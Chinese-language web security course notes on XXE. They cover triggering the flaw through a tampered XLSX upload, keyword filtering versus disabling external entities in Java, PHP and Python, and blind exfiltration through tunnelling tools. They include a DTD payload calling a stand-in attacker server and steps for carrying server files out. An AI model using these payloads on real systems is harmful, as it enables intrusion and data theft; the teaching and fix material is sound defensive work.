# Web安全：P44：XXE修复与利用 🛡️

![](img/b87a3e625cb628f671cfeb1756ced9fa_1.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_3.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_5.png)

在本节课中，我们将学习XXE（XML外部实体注入）漏洞的修复方法，并深入了解一种特殊的利用场景：通过上传Excel文件触发XXE漏洞。课程内容将涵盖漏洞原理、利用演示、修复方案以及实践练习。

## 概述

![](img/b87a3e625cb628f671cfeb1756ced9fa_7.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_9.png)

本节课是XXE课程的最后一节。我们将首先探讨一种特殊的XXE利用方式——通过上传特定构造的Excel文件触发漏洞。随后，我们将系统地学习在不同编程语言环境下修复XXE漏洞的标准方法。课程最后会布置相关的实战练习。

![](img/b87a3e625cb628f671cfeb1756ced9fa_11.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_13.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_15.png)

## Excel文件上传导致的XXE漏洞

![](img/b87a3e625cb628f671cfeb1756ced9fa_17.png)

上一节我们介绍了XXE的基本利用方式，本节中我们来看看一种特殊的攻击向量：利用Excel文件上传功能触发XXE。

![](img/b87a3e625cb628f671cfeb1756ced9fa_19.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_20.png)

如果网站存在文件上传功能，并且支持上传XLSX格式的Excel文件，则可能存在XXE漏洞。其原理在于，XLSX文件本质上是一个ZIP压缩包，内部包含多个XML文件。攻击者可以修改这些XML文件，插入恶意的DTD声明和外部实体引用。

![](img/b87a3e625cb628f671cfeb1756ced9fa_22.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_24.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_26.png)

以下是攻击流程的核心步骤：

1.  **构造恶意Excel文件**：将一个正常的XLSX文件重命名为ZIP后缀并解压。
2.  **修改XML内容**：找到并编辑解压后的 `[Content_Types].xml` 等文件，插入恶意的DTD和实体引用。例如：
    ```xml
    <!DOCTYPE test [
      <!ENTITY % file SYSTEM "http://攻击者服务器:9999/xxe-test">
      %file;
    ]>
    ```
3.  **重新打包并上传**：将修改后的文件重新打包为ZIP，再改回XLSX后缀，然后通过网站的上传功能提交。
4.  **接收请求**：如果服务器端解析了该Excel文件，就会向攻击者指定的URL（如 `http://攻击者服务器:9999/xxe-test`）发起HTTP请求，从而证实漏洞存在。

![](img/b87a3e625cb628f671cfeb1756ced9fa_28.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_30.png)

在CTF比赛和真实场景中，攻击者可以利用此方式，结合无回显技术，将服务器上的敏感文件数据外带出来。

## XXE漏洞的修复方案

![](img/b87a3e625cb628f671cfeb1756ced9fa_32.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_34.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_36.png)

了解了利用方式后，我们来看看如何修复XXE漏洞。修复的核心思想是禁用或严格限制XML解析器处理外部实体的能力。

以下是两种主要的修复方案：

### 方案一：过滤用户输入（不推荐）

此方法试图通过黑名单过滤用户输入的XML数据中的危险关键词，如 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`PUBLIC` 等。
然而，这种方法可能存在绕过风险，且维护成本高，并非根本解决方案。

### 方案二：禁用外部实体（推荐）

![](img/b87a3e625cb628f671cfeb1756ced9fa_38.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_40.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_42.png)

这是最有效、最直接的修复方式。在不同的开发语言中，可以通过配置XML解析器的安全属性来实现。

![](img/b87a3e625cb628f671cfeb1756ced9fa_44.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_45.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_47.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_49.png)

**在Java中**，使用DocumentBuilderFactory解析XML时，应设置以下属性：
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); // 禁用DTD
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false); // 禁用外部通用实体
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false); // 禁用外部参数实体
```

![](img/b87a3e625cb628f671cfeb1756ced9fa_51.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_53.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_55.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_56.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_58.png)

**在PHP中**，使用libxml库解析XML时，可以这样设置：
```php
libxml_disable_entity_loader(true);
```
此函数调用将禁止加载外部实体。

![](img/b87a3e625cb628f671cfeb1756ced9fa_59.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_61.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_62.png)

**在Python中**，使用lxml库时，可以这样设置解析器：
```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False) # 禁用实体解析
tree = etree.parse(xml_source, parser)
```

当解析器被正确配置后，尝试利用XXE漏洞的Payload将导致解析失败，并抛出类似“不允许文档类型声明”或“无法加载外部实体”的错误，从而有效防御攻击。

![](img/b87a3e625cb628f671cfeb1756ced9fa_64.png)

## 无回显XXE利用技巧补充

![](img/b87a3e625cb628f671cfeb1756ced9fa_66.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_68.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_70.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_72.png)

在实际渗透测试中，如果目标服务器无法将数据直接回显到页面上（即无回显XXE），我们需要将数据外带到自己控制的服务器。

![](img/b87a3e625cb628f671cfeb1756ced9fa_74.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_76.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_78.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_79.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_80.png)

如果你没有公网服务器，可以使用一些内网穿透工具来获得一个临时的公网访问地址。基本流程如下：
1.  注册并使用一个内网穿透服务（如ngrok、natapp等），它会为你分配一个临时域名。
2.  在本地启动一个HTTP服务（如Tomcat），并将其绑定到内网穿透工具指定的本地端口。
3.  将用于接收数据的DTD文件放置在本地HTTP服务的目录下。
4.  在XXE攻击Payload中，将实体引用的URL指向你的临时域名及DTD文件路径。
5.  当目标服务器解析XML并访问你的DTD时，敏感数据就会通过HTTP请求被带到你的本地服务日志中。

![](img/b87a3e625cb628f671cfeb1756ced9fa_82.png)

## 总结

![](img/b87a3e625cb628f671cfeb1756ced9fa_84.png)

![](img/b87a3e625cb628f671cfeb1756ced9fa_85.png)

本节课中我们一起学习了XXE漏洞的收尾知识。我们探讨了通过上传恶意Excel文件触发XXE的独特利用方式，并系统掌握了在Java、PHP、Python等语言中修复XXE漏洞的标准方法——即通过配置XML解析器来禁用外部实体加载。我们还补充了在无回显场景下利用内网穿透工具进行数据外带的技巧。

请务必完成课程相关的靶场练习，以巩固对XXE漏洞攻防的理解。